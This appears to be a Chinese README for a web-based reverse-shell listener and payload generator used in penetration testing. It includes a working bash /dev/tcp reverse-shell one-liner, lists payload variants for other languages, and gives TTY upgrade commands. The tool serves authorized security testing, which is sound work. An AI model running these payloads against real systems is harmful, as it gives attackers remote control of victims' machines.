# NC Shell v2.0 - 云端渗透测试框架

> 轻量级、纯 Web 化的反弹 Shell 管理平台，无需本地客户端，开箱即用
> 此项目长期更新；现在是V2.0
---

## 📖 关于项目
**NC Shell v2.0.77** 是一个基于 Web 的轻量级渗透测试框架，核心功能是提供云端反弹 Shell 监听与全功能交互式终端管理。
- 后端：纯 Python + Flask + Flask-SocketIO 实现，无第三方中间件依赖
- 前端：基于 xterm.js 实现原生终端体验，支持多会话管理
- 核心特性：一键 TTY 自动升级、多语言 Payload 生成、全功能交互式终端

---

## 🚀 快速开始
### 1. 环境准备
```bash
# 克隆项目
git clone https://github.com/L0g1cX/NCsH3LL.git
cd NCsH3LL

# 安装依赖
pip install flask flask-socketio eventlet

# 启动服务
python app.py
```
服务默认启动在 `http://0.0.0.0:5000`，直接在浏览器访问即可使用。

### 2. 操作流程
1.  **创建监听**：在左侧面板输入监听端口（默认 5020），勾选 `AUTO TTY UPGRADE`（可选），点击「启动」
2.  **生成 Payload**：在右侧 `PAYLOADS` 面板填写你的服务器公网 IP（LHOST）和监听端口（LPORT），选择目标系统对应的 Payload 类型并复制
3.  **执行反弹**：在目标机器上执行复制的 Payload，**需要目标机能访问服务机**连接建立后终端将自动激活，进入全功能交互模式
![PixPin_2026-04-15_00-42-46](https://github.com/user-attachments/assets/abca8e67-970e-43ca-8287-6fc007c4bcc9)

---

## ✨ 核心功能
### 1. 自动 TTY 升级 (AUTO TTY UPGRADE)
勾选该选项后，框架会在连接建立时**自动向目标注入完整 TTY 升级序列**，将普通哑 Shell 升级为全功能交互式终端，支持：
- Tab 键补全、方向键历史回溯
- Ctrl+C 中断进程、Ctrl+Z 挂起进程
- 终端尺寸自动同步、色彩渲染正常
- 标准输入/输出/错误流全交互

> ⚠️ 升级依赖目标系统已安装 `python3`，若目标无 python3 环境，请手动执行升级序列

### 2. 多语言 Payload 生成
内置主流反弹 Shell Payload 模板，一键生成，覆盖绝大多数目标环境：
- **Bash**：`bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1`
- **Python/Python3**：原生 Python 反弹 Shell
- **Perl/PHP/Ruby/Socat**：多语言适配
- **PowerShell (Pwsh)**：Windows 目标专用 Payload

### 3. 全功能 Web 终端
基于 xterm.js 实现原生终端体验，完美复刻本地 Shell 操作，支持：
- 多会话并行管理，一键切换
- 终端历史记录、复制粘贴
- 自定义终端尺寸、色彩主题
- 无状态连接，浏览器关闭后会话不中断

---

## 🔧 TTY 升级序列详解
### 自动执行的完整升级流程
```bash
# 1. 启动远端伪终端 (remote pseudo-terminal)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. 设置终端类型 (set terminal type)
export TERM=xterm-256color

# 3. 重置行规程 (reset line discipline)
# 确保 echo 正常、换行符 \n→\r\n 转换正确
stty sane

# 4. 同步终端尺寸 (sync terminal dimensions)
# 自动从前端 xterm.js 获取 rows/cols 数值
stty rows 35 cols 121
```

> 💡 与传统本地 nc 监听不同，Web 架构下 nc 以 subprocess(PIPE) 方式运行，**无需执行 `Ctrl+Z / stty raw -echo / fg` 流程**，直接完成全功能升级

---

## ⚠️ 注意事项
### 法律合规声明
> **本工具仅供授权渗透测试、安全研究和教学使用**
> 严禁在未获得合法授权的情况下，对任何系统、网络或设备使用本工具
> 使用者需自行承担因非法使用造成的一切法律责任，遵守《中华人民共和国网络安全法》等相关法律法规

### 技术说明
- 后端为单节点内存型架构，所有会话状态存储在服务端内存中，服务重启后会话将丢失
- 建议在云服务器（如腾讯云、阿里云）部署，确保公网 IP 可访问、防火墙放行监听端口（建议一段端口，例如5000-5010）
- 生产环境部署建议配置 Nginx 反向代理 + HTTPS 加密，提升安全性

---
